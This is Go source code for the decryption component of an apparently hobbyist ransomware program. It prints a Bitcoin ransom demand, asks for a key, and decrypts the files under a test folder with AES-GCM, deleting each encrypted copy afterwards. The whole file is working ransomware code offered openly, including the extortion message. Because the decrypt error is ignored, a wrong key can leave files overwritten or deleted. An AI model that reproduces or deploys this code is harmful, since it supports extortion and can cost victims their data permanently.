package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"os"
	"path/filepath"
)

func main() {
	fmt.Println("**********************************************************************")
	fmt.Println("  Bitcoin blockchain address ---> 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2  ")
	fmt.Println("  Send me 0.2 btc and i will send you the key :) ")
	fmt.Print("  key: ")

	var key string
	fmt.Scanln(&key)

	//initialize AES in GCM mode

	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		panic("error while setting up aes")
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic("error while setting up gcm")
	}

	//looping through target files
	filepath.Walk("C:\\testing", func(path string, info os.FileInfo, err error) error {
		//skip if directory
		if !info.IsDir() {
			//decrypt the file
			fmt.Println("Decrypting " + path + "...")

			//read file contents
			encrypted, err := os.ReadFile(path)
			if err == nil {
				//Decrypt bytes
				nonce := encrypted[:gcm.NonceSize()]
				encrypted = encrypted[gcm.NonceSize():]
				original, err := gcm.Open(nil, nonce, encrypted, nil)

				//write decrypted contents
				err = os.WriteFile(path[:len(path)-4], original, 0666)
				if err == nil {
					os.Remove(path) //delete the encrypted file
				} else {
					fmt.Println("error while writing contents")
				}

			} else {
				fmt.Println("error while reading file contents")
			}
		}

		return nil
	})
}
